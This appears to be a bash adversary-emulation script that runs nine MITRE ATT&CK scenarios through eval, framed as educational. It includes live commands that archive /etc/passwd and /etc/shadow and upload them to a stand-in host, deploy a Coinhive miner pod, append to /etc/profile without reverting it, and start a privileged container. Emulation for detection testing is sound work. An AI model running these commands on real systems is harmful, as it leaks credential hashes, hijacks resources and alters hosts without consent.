#!/bin/bash

# MITRE ATT&CK Technique Simulation Script
# This script runs a sophisticated simulation aligned with MITRE ATT&CK techniques.
# It is intended for educational purposes and should only be executed in secure, isolated environments such as containerized Kubernetes clusters.

# MITRE Techniques covered:
# T1078 - Valid Accounts
# T1071 - Application Layer Protocol
# T1082 - System Information Discovery
# T1560 - Archive Collected Data
# T1021 - Remote Services
# T1496 - Resource Hijacking
# T1574 - Hijack Execution Flow

# Set up environment variables
DOWNLOAD_DIR="/tmp/attack_scenarios"
mkdir -p $DOWNLOAD_DIR

# Function to run a scenario
function run_scenario() {
    local description=$1
    local command=$2
    echo "\nRunning scenario: $description"
    echo "------------------------------------------------------------"
    eval $command
    echo "------------------------------------------------------------\n"
}

# Scenario 1: System Information Discovery (T1082)
run_scenario "System Information Discovery (T1082)" \
    "uname -a && lscpu && df -h && cat /etc/os-release && hostname"

# Scenario 2: Network Connection Using Application Layer Protocol (T1071)
run_scenario "Network Connection Using Application Layer Protocol (HTTP) (T1071)" \
    "curl -I http://example.com"

# Scenario 3: Creating an Archive with Collected Data (T1560)
run_scenario "Creating Archive of System Logs (T1560)" \
    "tar -czvf $DOWNLOAD_DIR/system_logs.tar.gz /var/log/*"

# Scenario 4: Using Valid Accounts for Privileged Actions (T1078)
run_scenario "Simulating Use of Valid Accounts (T1078) - Accessing Sensitive Directories" \
    "if [ \"$(id -u)\" -eq 0 ]; then echo 'Accessing sensitive directory as root'; ls /root; else echo 'Not running as root'; fi"

# Scenario 5: Remote Service (SSH) Access (T1021)
run_scenario "SSH Access Simulation to Another Container or Node (T1021)" \
    "ssh -o StrictHostKeyChecking=no user@127.0.0.1 -p 2222 'hostname && whoami'" # Replace with a dummy IP and appropriate credentials.

# Scenario 6: Cryptominer Deployment - Resource Hijacking (T1496)
run_scenario "Deploy Cryptominer Container (T1496 - Resource Hijacking)" \
    "kubectl run cryptominer-example --image=rkjnsn/coinhive-miner:latest --restart=Never"

# Scenario 7: Hijack Execution Flow by Injecting Malicious Script (T1574)
run_scenario "Injecting Malicious Script to Hijack Execution Flow (T1574)" \
    "echo 'echo Malicious activity detected' >> /etc/profile && source /etc/profile"

# Scenario 8: Unauthorized File Access and Exfiltration (T1020)
run_scenario "Unauthorized File Access and Exfiltration Simulation (T1020)" \
    "tar -czvf $DOWNLOAD_DIR/sensitive_data.tar.gz /etc/passwd /etc/shadow && curl -T $DOWNLOAD_DIR/sensitive_data.tar.gz http://example.com/upload"

# Scenario 9: Running a Container in Privileged Mode (T1068 - Exploitation for Privilege Escalation)
run_scenario "Running a Container in Privileged Mode (T1068 - Privilege Escalation)" \
    "docker run -d --name privileged-container --privileged nginx:alpine"

# Cleanup function to remove all created artifacts
function cleanup() {
    echo "\nCleaning up..."
    rm -rf $DOWNLOAD_DIR
    docker rm -f cryptominer-example privileged-container
    kubectl delete pod cryptominer-example --ignore-not-found
}

trap cleanup EXIT

# Summary and Warning
cat << EOF

This script has demonstrated a series of advanced MITRE ATT&CK techniques, including:
1. System Information Discovery (T1082).
2. Network connection using HTTP for communication (T1071).
3. Archiving collected data (T1560).
4. Using valid accounts for privileged actions (T1078).
5. Remote SSH service access (T1021).
6. Deploying a cryptominer for resource hijacking (T1496).
7. Hijacking execution flow using injected malicious scripts (T1574).
8. Unauthorized file access and exfiltration (T1020).
9. Running a container in privileged mode (T1068).

These scenarios are strictly for educational purposes in secure, isolated environments and should never be used in production environments.
EOF
